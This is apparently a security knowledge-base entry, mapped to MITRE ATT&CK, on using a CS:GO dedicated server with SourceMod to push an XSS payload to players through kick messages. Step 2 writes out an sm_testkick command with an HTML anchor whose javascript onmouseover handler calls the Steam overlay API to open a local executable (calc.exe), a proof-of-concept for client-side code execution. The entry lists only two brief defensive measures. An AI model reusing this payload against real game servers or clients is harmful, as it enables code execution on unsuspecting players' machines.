---
tags:
  - server-setup
  - kick-test
  - csgo
type: procedure
tools:
  - '[[tools/csgo-dedicated-server]]'
  - '[[tools/sourcemod]]'
  - '[[tools/metamod]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/kickid]]'
  - '[[commands/sm-kick]]'
  - '[[commands/sm-testkick-with-rce-payload]]'
platforms:
  - Windows
  - 'CS:GO'
techniques:
  - '[[Exploitation for Client Execution]]'
skill_level: advanced
impact_level: high
detection_risk: medium
sub_techniques: []
id: 8bba1357-58bf-491c-adc0-151dc8a00b82
created_at: '2025-12-14T00:11:25.221Z'
updated_at: '2025-12-14T00:11:25.221Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
---
# Setup Dedicated Server and Test Remote Kick

## Summary

This procedure sets up a CS:GO dedicated server with SourceMod to test remote kick functionality and payload injection for XSS.

## Description

Initial tests with kickid fail on local servers; switch to dedicated server with SourceMod for sm_kick, but character limits require custom functions.

## Requirements

1. CS:GO dedicated server installation
2. SourceMod and Metamod
3. Admin access to server console

## Defense

Defensive measures and detection strategies:

- Restrict kick message lengths
- Monitor server plugins for malicious code

## Objectives

1. Establish remote delivery mechanism
2. Test payload limits
3. Confirm remote XSS

## Instructions

### Step 1: Install Server and Mods

**Context**: Setup base server environment.

Install [[tools/csgo-dedicated-server]], [[tools/metamod]], and [[tools/sourcemod]].

> Configure for plugin support.

### Step 2: Test Kick Commands

**Context**: Attempt kicks with payloads.

Use [[commands/kickid]] (local, unsuccessful), then [[commands/sm-kick]] on dedicated server, and [[commands/sm-testkick-with-rce-payload]]:

```bash
sm_testkick <a onmouseover="javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')">The remote host stopped receiving communications and closed the connection</a>
```

> Observe kick with limited payload.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Exploitation for Client Execution]]

### Sub-Techniques



## Commands Used

- [[commands/kickid]]
- [[commands/sm-kick]]
- [[commands/sm-testkick-with-rce-payload]]

## Tools Used

- [[tools/csgo-dedicated-server]]
- [[tools/sourcemod]]
- [[tools/metamod]]

## Tags

- [[server-setup]]
- [[kick-test]]
- [[csgo]]
